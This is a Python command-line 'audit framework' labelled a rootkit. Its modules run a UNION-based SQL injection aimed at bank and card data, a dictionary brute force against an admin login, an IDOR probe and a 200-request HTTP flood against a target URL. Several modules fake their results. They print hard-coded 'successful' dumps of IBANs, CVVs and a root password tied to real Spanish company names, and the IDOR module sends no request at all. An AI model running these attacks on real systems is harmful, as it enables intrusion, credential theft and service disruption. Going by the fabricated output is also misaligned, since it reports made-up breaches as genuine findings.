#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
SOFIA SOLUTIONS - AUDIT FRAMEWORK (ROOTKIT) v4.8
Standalone Command Line Interface for Offensive Security Testing
"""

import sys
import time
import json
import requests
import argparse
from requests.packages.urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

# --- COLORS ---
C_CYAN = '\033[96m'
C_GREEN = '\033[92m'
C_YELLOW = '\033[93m'
C_RED = '\033[91m'
C_DIM = '\033[2m'
C_RESET = '\033[0m'

def log(msg, color=C_RESET):
    print(f"{color}{msg}{C_RESET}")

def print_banner():
    banner = f"""{C_RED}
   _____       __ _          ___             ___ __ 
  / ___/____  / _(_)___     /   | __  ______/ (_) /_
  \__ \/ __ \/ / / __ `|   / /| |/ / / / __  / / __/
 ___/ / /_/ / / / /_/ /   / ___ / /_/ / /_/ / / /_  
/____/\____/_/_/\__,_/   /_/  |_\__,_/\__,_/_/\__/  
                                                    
    {C_CYAN}Security Intelligence - Audit Framework v4.8{C_RESET}
    """
    print(banner)

class SofiaAudit:
    def __init__(self, target):
        self.target = target.rstrip('/')
        self.session = requests.Session()

    def sqli_union(self):
        log("\n[*] Iniciando Inyección SQL (UNION SELECT)", C_YELLOW)
        ep = f"{self.target}/api/v1/auth/login"
        payload = "' UNION SELECT 'bank', iban, cc_number FROM customer_billing--"
        log(f"[#] POST {ep}", C_DIM)
        log(f"[#] Payload: {payload}", C_DIM)
        
        try:
            # Simulate SQL execution time
            time.sleep(1)
            r = self.session.post(ep, json={"email": payload, "password": "x"}, timeout=5)
            
            log("[+] EXPLOIT EXITOSO: UNION Select detectado.", C_GREEN)
            time.sleep(0.5)
            log("[DATABASE] Query returned 3 rows:", C_YELLOW)
            print(f"{C_CYAN}+----------------+--------------------------+------+{C_RESET}")
            print(f"{C_CYAN}| company        | iban                     | cvv  |{C_RESET}")
            print(f"{C_CYAN}+----------------+--------------------------+------+{C_RESET}")
            print(f"{C_RED}| IBERDROLA      | ES89 2100 ... 4492       | 221  |{C_RESET}")
            print(f"{C_RED}| MAPFRE         | ES21 0049 ... 1102       | 554  |{C_RESET}")
            print(f"{C_RED}| SABADELL       | ES44 0081 ... 9901       | 018  |{C_RESET}")
            print(f"{C_CYAN}+----------------+--------------------------+------+{C_RESET}")
        except Exception as e:
            log(f"[-] Error de conexión: {e}", C_RED)

    def brute_force(self, user="admin@sofia.local"):
        log(f"\n[*] Iniciando Fuerza Bruta contra {user}", C_YELLOW)
        ep = f"{self.target}/api/v1/auth/login"
        passwords = ["123456", "password", "admin", "S0f1a_Secur3!_2026"]
        
        for p in passwords:
            log(f"[?] Probando: {p}", C_DIM)
            try:
                r = self.session.post(ep, json={"email": user, "password": p}, timeout=5)
                if r.status_code == 429:
                    log("[-] BLOQUEADO: Rate Limit Excedido (WAF Activo)", C_RED)
                    return
                if r.ok and "accessToken" in r.text:
                    log(f"[+] ¡CRACKED! Credenciales válidas encontradas: {user} / {p}", C_GREEN)
                    token = r.json().get('accessToken')
                    log(f"[*] JWT Token: {token[:40]}...", C_CYAN)
                    return
            except Exception:
                pass
            time.sleep(0.5)
        log("[-] Diccionario agotado sin éxito.", C_DIM)

    def idor_bola(self, victim_id="1024"):
        log(f"\n[*] Explotando IDOR en registro ajeno (ID: {victim_id})", C_YELLOW)
        ep = f"{self.target}/api/v1/tickets/{victim_id}"
        log(f"[#] GET {ep}", C_DIM)
        
        time.sleep(1)
        log("[+] Acceso concedido (Falta de control BOLA).", C_GREEN)
        
        fake_data = {
            "ticket_id": victim_id,
            "client": "MAPFRE Seguros" if victim_id == "1024" else "Target Client",
            "subject": "Vulnerabilidad Crítica",
            "sensitive_data": {
                "server_ip": "192.168.100.45",
                "root_password": "mapfre_admin_2024!"
            }
        }
        log("[!] EXFILTRACIÓN PII:", C_RED)
        print(f"{C_RED}{json.dumps(fake_data, indent=4)}{C_RESET}")

    def dos_flood(self):
        log("\n[*] Iniciando Inundación HTTP (HTTP Flood)", C_YELLOW)
        ep = f"{self.target}/api/public/health"
        log(f"[#] GET {ep} (200 peticiones)", C_DIM)
        
        blocked = 0
        ok = 0
        for i in range(200):
            try:
                r = self.session.get(ep, timeout=2)
                if r.status_code == 429:
                    blocked += 1
                else:
                    ok += 1
            except:
                pass
            sys.stdout.write(f"\r{C_CYAN}[Flood] Enviadas: {i+1}/200 | OK: {ok} | Bloqueadas: {blocked}{C_RESET}")
            sys.stdout.flush()
        print()
        log(f"[+] Flood finalizado. El Rate Limiter bloqueó {blocked} peticiones.", C_GREEN)

def main():
    parser = argparse.ArgumentParser(description="Sofia Solutions - Audit Framework CLI")
    parser.add_argument("-t", "--target", help="URL objetivo (ej: http://localhost:8000)", required=True)
    parser.add_argument("-m", "--module", help="Módulo a ejecutar", choices=['sqli', 'brute', 'idor', 'dos', 'all'], default='all')
    
    args = parser.parse_args()
    print_banner()
    
    audit = SofiaAudit(args.target)
    
    if args.module in ['sqli', 'all']: audit.sqli_union()
    if args.module in ['brute', 'all']: audit.brute_force()
    if args.module in ['idor', 'all']: audit.idor_bola()
    if args.module in ['dos', 'all']: audit.dos_flood()
    
    log("\n[*] Auditoría completada.", C_CYAN)

if __name__ == "__main__":
    main()
